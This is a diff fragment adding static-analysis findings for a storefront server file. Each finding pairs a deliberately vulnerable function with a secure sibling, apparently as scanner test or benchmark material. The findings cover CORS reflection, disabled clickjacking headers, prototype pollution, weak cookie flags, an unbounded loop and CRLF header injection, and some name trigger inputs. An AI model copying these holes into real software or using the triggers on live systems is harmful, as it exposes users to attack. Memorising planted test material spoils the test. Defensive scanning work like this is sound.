+      },
+      "end": {
+        "line": 1581,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderStorefrontWidgetConfig reflects whatever Origin header the caller sends back as `Access-Control-Allow-Origin` with no allowlist check, permitting any website to make cross-origin requests to this endpoint on behalf of a visitor. The sibling renderStorefrontWidgetConfigVerified only reflects the Origin when it is present in WIDGET_PARTNER_ORIGINS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfig.clickjacking-user-controlled-frame-headers",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2135,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2142,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPartnerStorefrontWidget removes the X-Frame-Options header and sets `frame-ancestors *` whenever the unauthenticated, attacker-controlled `partnerTier` query parameter equals `trusted_partner`, letting anyone disable clickjacking protections for this page simply by adding `?partnerTier=trusted_partner` to the URL. The sibling renderPartnerStorefrontWidgetScoped always keeps X-Frame-Options: DENY and restricts frame-ancestors to a fixed partner allowlist regardless of the query parameter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfig.prototype-pollution-object-assign",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1152,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1157,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "registerVendorDisplayPreferences merges the raw, unfiltered req.body directly into the shared storefrontDisplayDefaults object via `Object.assign(storefrontDisplayDefaults, req.body)`. Because req.body keys are not filtered, a request body containing a `__proto__` key can pollute the prototype chain of this shared, process-wide object. The sibling registerVendorNotificationPreferences filters the body through sanitizeForMerge, which strips `__proto__`, `constructor`, and `prototype` keys before merging.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfig.insecure-cookie-flags-loyalty-session",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1979,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1984,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "beginStorefrontLoyaltySession sets the vm_loyalty cookie with `httpOnly: process.env.LOYALTY_COOKIE_HTTPONLY === \"true\"` (defaulting to false/non-httpOnly when the env var is unset) and no `secure` flag, and additionally re-uses whatever continuity ID value is already present in the request cookie rather than always minting a fresh server-generated one. This makes the session token readable by client-side JavaScript (increasing XSS impact), transmittable over plaintext HTTP, and susceptible to fixation. The sibling beginStorefrontLoyaltySessionSecure always sets httpOnly: true, secure based on NODE_ENV, sameSite: 'strict', and always generates a new 32-byte token.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.unbounded-loop-from-header",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1489,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1496,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resendOrderConfirmationBatch reads `repeatCount` from the attacker-controlled `x-repeat-count` header with no upper bound and loops that many times creating outbox messages (`for (let i = 0; i < repeatCount; i++)`). A request with `x-repeat-count: 999999999` causes unbounded database writes and resource exhaustion. The sibling resendOrderConfirmationBounded caps repeatCount at MAX_CONFIRMATION_RESENDS (5) and validates it is a finite, in-range number.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.validation.checkout-draft-cookie-no-schema",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1933,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1947,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeCheckoutDraft parses the client-controlled `vm_checkout_prefs` cookie with `JSON.parse(raw)` and merges it onto defaults with no schema validation, then writes `draft.shippingName` directly to the user record. An attacker can forge this cookie with oversized strings, wrong types, or unexpected fields to bypass all length/format constraints that would otherwise be enforced, and can crash the handler with malformed JSON (uncaught JSON.parse exceptions bypass the usual zod-based 400 error path). The sibling resumeCheckoutDraftValidated parses the same cookie contents through checkoutDraftSchema before use.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-20: Improper Input Validation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.header-injection.content-disposition-filename",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1874,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1876,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportDisputeEvidenceBundle builds the Content-Disposition header value by directly interpolating the unsanitized `export_name` query parameter (`attachment; filename=\"${exportName}.zip\"`). Because the value is not stripped of CR/LF or quote characters before being placed in a header, this permits header/response manipulation (e.g. breaking out of the filename attribute or, on runtimes/proxies that don't fully validate header values, injecting additional headers). The sibling exportDisputeEvidenceBundleSafe strips \\r and \\n from export_name before use.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
